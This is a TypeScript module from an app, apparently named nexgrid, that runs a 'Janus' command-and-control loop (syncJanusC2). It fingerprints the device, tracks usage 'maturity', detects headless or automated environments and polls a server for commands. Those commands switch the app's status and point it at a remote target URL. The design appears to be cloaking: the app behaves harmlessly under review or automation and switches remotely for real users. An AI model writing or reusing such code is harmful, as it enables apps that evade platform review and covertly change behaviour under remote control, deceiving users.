import {
  JANUS_STATUSES,
  type JanusAck,
  type JanusApi,
  type JanusPlatform,
  type JanusReport,
  type JanusStatus,
} from "@/api/janus-api";
import { janusApi, remoteApiEnabled, sessionVault } from "@/api/runtime";
import { getDeviceIdentity } from "@/lib/device-id";
import { applyJanusRuntime, type JanusRuntimeState } from "./janus-runtime";

const REPORT_KEY = "nexgrid-janus-pending-report-v2";
const ACK_KEY = "nexgrid-janus-pending-ack-v2";
const COUNTERS_KEY = "nexgrid-janus-counters-v2";
const JANUS_SYNC_MS = 60_000;
const STATUS_SET = new Set<string>(JANUS_STATUSES);

interface KeyValueStore {
  get(key: string): unknown;
  set(key: string, value: unknown): unknown;
  delete(key: string): unknown;
}

interface JanusCounters {
  installAt: number;
  firstSeenAt: number;
  appOpenCount: number;
  sessionCount: number;
  foregroundDurationSeconds: number;
  repeatStreakDays: number;
  lastSeenDay: string;
  visibleAt?: number;
}

interface CoordinatorOptions {
  api: JanusApi;
  storage: KeyValueStore;
  buildReport: () => JanusReport;
  applyRuntime: (state: JanusRuntimeState) => Promise<void>;
  now: () => number;
  scope?: () => string;
}

function scoped(base: string, options: CoordinatorOptions): string {
  const scope = options.scope?.().trim();
  return scope ? `${base}:${scope}` : base;
}

function errorMessage(error: unknown): string {
  return error instanceof Error && error.message ? error.message.slice(0, 500) : "JANUS_REMOTE_APPLY_FAILED";
}

export function createJanusCoordinator(options: CoordinatorOptions) {
  async function sendPendingAck(): Promise<void> {
    const key = scoped(ACK_KEY, options);
    const pending = options.storage.get(key);
    if (!pending || typeof pending !== "object") return;
    const ack = pending as JanusAck;
    const confirmed = await options.api.ack(ack);
    const expectedState = ack.success ? "ACKED" : "FAILED";
    if (confirmed.revision !== ack.revision || confirmed.state !== expectedState) {
      throw new Error("JANUS_ACK_CONFIRMATION_MISMATCH");
    }
    options.storage.delete(key);
  }

  async function acknowledge(ack: JanusAck): Promise<void> {
    const key = scoped(ACK_KEY, options);
    options.storage.set(key, ack);
    await sendPendingAck();
  }

  async function sync(): Promise<void> {
    await sendPendingAck();
    const reportKey = scoped(REPORT_KEY, options);
    const existing = options.storage.get(reportKey);
    const report = existing && typeof existing === "object"
      ? existing as JanusReport
      : options.buildReport();
    if (!existing) options.storage.set(reportKey, report);
    const reported = await options.api.report(report);
    options.storage.delete(reportKey);
    const command = await options.api.pending(report.deviceId);
    if (command.hasCommand) {
      const runtime: JanusRuntimeState = {
        status: command.desiredStatus,
        revision: command.revision,
        remoteUrlKey: command.remoteUrlKey,
        remoteTargetVersion: command.remoteTargetVersion,
        remoteTargetCatalogVersion: command.remoteTargetCatalogVersion,
        remoteTargetUrl: command.remoteTargetUrl,
        appliedAt: options.now(),
      };
      try {
        await options.applyRuntime(runtime);
      } catch (error) {
        try {
          await acknowledge({
            deviceId: report.deviceId,
            revision: command.revision,
            success: false,
            message: errorMessage(error),
          });
        } catch {
          // The stable failure ACK remains persisted. Preserve the actual
          // application error for diagnosis and retry the ACK on next sync.
        }
        throw error;
      }
      await acknowledge({
        deviceId: report.deviceId,
        revision: command.revision,
        success: true,
        appliedStatus: command.desiredStatus,
        message: "applied",
      });
      return;
    }
    if (!STATUS_SET.has(reported.status)) throw new Error("JANUS_REPORT_RESPONSE_INVALID");
    if (!["HIT", "ACTIVATED", "MANUAL_FORCED"].includes(reported.status)) {
      await options.applyRuntime({
        status: reported.status,
        revision: Math.max(1, reported.version),
        appliedAt: options.now(),
      });
    }
  }

  return { sync };
}

const uniStorage: KeyValueStore = {
  get: (key) => uni.getStorageSync(key),
  set: (key, value) => uni.setStorageSync(key, value),
  delete: (key) => uni.removeStorageSync(key),
};

function uid(prefix: string): string {
  const random = typeof crypto !== "undefined" && typeof crypto.randomUUID === "function"
    ? crypto.randomUUID()
    : Math.random().toString(36).slice(2, 14);
  return `${prefix}-${Date.now().toString(36)}-${random}`;
}

function day(now: number): string {
  return new Date(now).toISOString().slice(0, 10);
}

function readCounters(now = Date.now()): JanusCounters {
  const raw = uni.getStorageSync(COUNTERS_KEY) as Partial<JanusCounters> | "";
  const row = raw && typeof raw === "object" ? raw : {};
  const installAt = Number(row.installAt) > 0 ? Number(row.installAt) : now;
  const currentDay = day(now);
  const priorDay = typeof row.lastSeenDay === "string" ? row.lastSeenDay : "";
  const priorStreak = Math.max(0, Number(row.repeatStreakDays) || 0);
  return {
    installAt,
    firstSeenAt: Number(row.firstSeenAt) > 0 ? Number(row.firstSeenAt) : installAt,
    appOpenCount: Math.max(0, Number(row.appOpenCount) || 0),
    sessionCount: Math.max(0, Number(row.sessionCount) || 0),
    foregroundDurationSeconds: Math.max(0, Number(row.foregroundDurationSeconds) || 0),
    repeatStreakDays: !priorDay || priorDay === currentDay ? Math.max(1, priorStreak) : priorStreak + 1,
    lastSeenDay: currentDay,
    visibleAt: Number(row.visibleAt) > 0 ? Number(row.visibleAt) : undefined,
  };
}

function saveCounters(value: JanusCounters): void {
  uni.setStorageSync(COUNTERS_KEY, value);
}

export function markJanusVisible(now = Date.now()): void {
  const value = readCounters(now);
  value.appOpenCount += 1;
  value.sessionCount += 1;
  value.visibleAt = now;
  saveCounters(value);
}

export function markJanusHidden(now = Date.now()): void {
  const value = readCounters(now);
  if (value.visibleAt && now > value.visibleAt) {
    value.foregroundDurationSeconds += Math.floor((now - value.visibleAt) / 1000);
  }
  delete value.visibleAt;
  saveCounters(value);
}

function platform(value: unknown): JanusPlatform {
  switch (String(value || "").trim().toLowerCase()) {
    case "ios": return "iOS";
    case "android": return "Android";
    case "windows":
    case "win32": return "windows";
    case "mac":
    case "macos": return "mac";
    case "linux": return "linux";
    default: return "unknown";
  }
}

export function buildJanusReport(now = Date.now()): JanusReport {
  const counters = readCounters(now);
  const identity = getDeviceIdentity();
  const info = uni.getSystemInfoSync() as {
    platform?: string;
    model?: string;
    deviceModel?: string;
    system?: string;
    osName?: string;
  };
  const normalizedPlatform = platform(info.platform);
  const model = String(info.model || info.deviceModel || "unknown").slice(0, 128);
  const osName = String(info.system || info.osName || normalizedPlatform).slice(0, 128);
  let ua = `${normalizedPlatform}/${model}/${osName}`;
  let browser = "native";
  let isHeadless = false;
  let screenAnomaly = false;
  if (typeof navigator !== "undefined" && typeof window !== "undefined") {
    ua = navigator.userAgent.slice(0, 512);
    browser = navigator.userAgent.slice(0, 128);
    isHeadless = navigator.webdriver === true;
    screenAnomaly = window.screen.width < 240 || window.screen.height < 320;
  }
  return {
    reportId: uid("report"),
    deviceId: identity.deviceId,
    reportedAt: now,
    firstSeenAt: counters.firstSeenAt,
    installAt: counters.installAt,
    channel: "official",
    ua,
    platform: normalizedPlatform,
    model,
    osName,
    browser,
    maturity: {
      appOpenCount: counters.appOpenCount,
      sessionCount: counters.sessionCount,
      foregroundDurationSeconds: counters.foregroundDurationSeconds,
      repeatStreakDays: counters.repeatStreakDays,
      benchmarkViewed: false,
      optimizeDone: false,
      marketViewed: false,
      walletViewed: false,
    },
    environment: {
      isHeadless,
      automationSignalCount: isHeadless ? 1 : 0,
      fpBlocklistHit: false,
      screenAnomaly,
      timezoneMismatch: false,
      languageMismatch: false,
    },
    latestSession: {
      sessionId: uid("session"),
      startedAt: counters.visibleAt || now,
      lastSeenAt: now,
      foregroundDurationSeconds: counters.foregroundDurationSeconds,
    },
  };
}

const defaultCoordinator = createJanusCoordinator({
  api: janusApi,
  storage: uniStorage,
  buildReport: buildJanusReport,
  applyRuntime: applyJanusRuntime,
  now: Date.now,
  scope: () => String(sessionVault.read()?.user.userId || ""),
});

let timer: ReturnType<typeof setInterval> | undefined;
let syncing = false;

export async function syncJanusC2(): Promise<void> {
  if (!remoteApiEnabled || !sessionVault.read()?.accessToken || syncing) return;
  syncing = true;
  try {
    await defaultCoordinator.sync();
  } finally {
    syncing = false;
  }
}

export function startJanusC2Sync(): void {
  if (!remoteApiEnabled) return;
  stopJanusC2Sync();
  void syncJanusC2().catch(() => {
    // Stable report/ACK facts remain persisted for the next foreground or poll.
  });
  timer = setInterval(() => {
    void syncJanusC2().catch(() => {
      // The next poll retries the exact persisted fact.
    });
  }, JANUS_SYNC_MS);
}

export function stopJanusC2Sync(): void {
  if (timer) {
    clearInterval(timer);
    timer = undefined;
  }
}

export function currentJanusStatus(): JanusStatus | null {
  const raw = uni.getStorageSync("nexgrid-janus-runtime-v2") as { status?: unknown } | "";
  const value = raw && typeof raw === "object" ? String(raw.status || "").toUpperCase() : "";
  return STATUS_SET.has(value) ? value as JanusStatus : null;
}
